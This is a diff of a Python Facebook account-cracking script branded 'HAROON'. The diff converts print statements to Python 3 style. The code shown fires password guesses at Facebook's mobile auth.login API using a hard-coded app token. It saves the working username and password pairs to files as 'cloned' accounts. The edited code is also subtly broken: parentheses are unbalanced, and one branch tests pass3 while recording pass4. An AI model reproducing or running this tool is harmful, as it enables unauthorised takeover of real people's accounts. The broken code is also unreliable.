@@ -177,13 +177,13 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[92m  [HAROON-OK]  ' + k + c + user + '  |  ' + pass1
+                print ('\x1b[92m  [HAROON-OK]  ') + k + c + user + '  |  ' + pass1
                 okb = open('save/CP.txt', 'a')
                 okb.write(k + c + user + pass1 + '\n')
                 okb.close()
                 oks.append(c + user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;91m  [HAROON-CP] ' + k + c + user + '  |  ' + pass1
+                print ('\x1b[1;91m  [HAROON-CP] ') + k + c + user + '  |  ' + pass1
                 cps = open('save/CP.txt', 'a')
                 cps.write(k + c + user + pass1 + '\n')
                 cps.close()
@@ -193,13 +193,13 @@ def action():
                 data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                 q = json.load(data)
                 if 'access_token' in q:
-                    print '\x1b[1;92m  [HAROON--OK] ' + k + c + user + '  |  ' + pass2
+                    print ('\x1b[1;92m  [HAROON--OK] ') + k + c + user + '  |  ' + pass2
                     okb = open('save/OK.txt', 'a')
                     okb.write(k + c + user + pass2 + '\n')
                     okb.close()
                     oks.append(c + user + pass2)
                 elif 'www.facebook.com' in q['error_msg']:
-                    print '\x1b[1;92m  [HAROON-OK] ' + k + c + user + '  |  ' + pass2
+                    print ('\x1b[1;92m  [HAROON-OK] ') + k + c + user + '  |  ' + pass2
                     cps = open('save/CP.txt', 'a')
                     cps.write(k + c + user + pass2 + '\n')
                     cps.close()
@@ -209,13 +209,13 @@ def action():
                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print '\x1b[1;92m  [HAROON-OK]  ' + k + c + user + '  |  ' + pass3
+                        print ('\x1b[1;92m  [HAROON-OK]  ') + k + c + user + '  |  ' + pass3
                         okb = open('save/CP.txt', 'a')
                         okb.write(k + c + user + pass3 + '\n')
                         okb.close()
                         oks.append(c + user + pass3)
                     elif 'www.facebook.com' in q['error_msg']:
-                        print '\x1b[1;92m  [HAROON-CP] ' + k + c + user + '  |  ' + pass3
+                        print ('\x1b[1;92m  [HAROON-CP] ') + k + c + user + '  |  ' + pass3
                         cps = open('save/CP.txt', 'a')
                         cps.write(k + c + user + pass3 + '\n')
                         cps.close()
@@ -225,13 +225,13 @@ def action():
                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print '\x1b[1;92m  [HAROON-OK]  ' + k + c + user + '  |  ' + pass4
+                        print ('\x1b[1;92m  [HAROON-OK]  ') + k + c + user + '  |  ' + pass4
                         okb = open('save/CP.txt', 'a')
                         okb.write(k + c + user + pass4 + '\n')
                         okb.close()
                         oks.append(c + user + pass4)
                     elif 'www.facebook.com' in q['error_msg']:
-                        print '\x1b[1;91m  [HAROON-CP] ' + k + c + user + '  |  ' + pass4
+                        print ('\x1b[1;91m  [HAROON-CP] ') + k + c + user + '  |  ' + pass4
                         cps = open('save/CP.txt', 'a')
                         cps.write(k + c + user + pass4 + '\n')
                         cps.close()
@@ -247,7 +247,7 @@ def action():
     print ('Total OK : ' + str(len(oks))
     print ('Total CP : ' + str(len(cpb))
     print(47*"-")
-    print 'Cloned Accounts Has Been Saved : save/cloned.txt')
+    print ('Cloned Accounts Has Been Saved : save/cloned.txt')
     jalan('Note : Cp account  10 say 12 days BAD OPEN KRY')
     raw_input('\n\x1b[1;95m[\x1b[1;98mHAROON_menu_Back\x1b[1;95m]')
     login()
